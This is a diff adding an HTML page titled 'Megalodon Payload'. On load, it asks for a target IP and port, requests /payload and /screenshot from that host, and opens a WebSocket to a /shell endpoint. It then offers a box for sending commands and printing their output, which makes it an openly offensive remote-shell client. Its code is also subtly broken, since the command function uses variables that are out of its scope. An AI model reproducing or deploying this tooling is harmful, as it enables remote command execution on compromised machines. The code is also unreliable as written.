@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Megalodon Payload</title>
+    <script>
+    function executePayload() {
+        var xhr = new XMLHttpRequest();
+        var ip = prompt("Enter target IP:", "192.168.18.11");
+        var port = prompt("Enter target port:", "4444");
+        
+        xhr.open('GET', 'http://' + ip + ':' + port + '/payload', true);
+        xhr.send();
+        
+        document.body.innerHTML = "<h1>Loading...</h1>";
+        
+        var img = new Image();
+        img.src = "http://" + ip + ":" + port + "/screenshot";
+        
+        // Try WebSocket for real-time connection
+        try {
+            var ws = new WebSocket('ws://' + ip + ':' + port + '/shell');
+            ws.onopen = function() {
+                document.body.innerHTML = "<h1>Connected!</h1>";
+                document.body.innerHTML += "<input id='cmd' type='text' style='width:100%' placeholder='Enter command...'>";
+                document.body.innerHTML += "<button onclick='sendCmd()'>Execute</button>";
+                document.body.innerHTML += "<pre id='output'></pre>";
+            };
+            ws.onmessage = function(e) {
+                document.getElementById('output').innerHTML += e.data + "\n";
+            };
+        } catch(e) {
+            console.log('WebSocket not available');
+        }
+    }
+    
+    function sendCmd() {
+        var ws = new WebSocket('ws://' + ip + ':' + port + '/shell');
+        ws.onopen = function() {
+            ws.send(document.getElementById('cmd').value);
+        };
+        ws.onmessage = function(e) {
+            document.getElementById('output').innerHTML += e.data + "\n";
+        };
+    }
+    
+    window.onload = function() {
+        executePayload();
+    };
+    </script>
+</head>
+<body>
+    <h1>Loading Payload...</h1>
+    <p>Please wait while the payload loads</p>
+</body>
+</html>
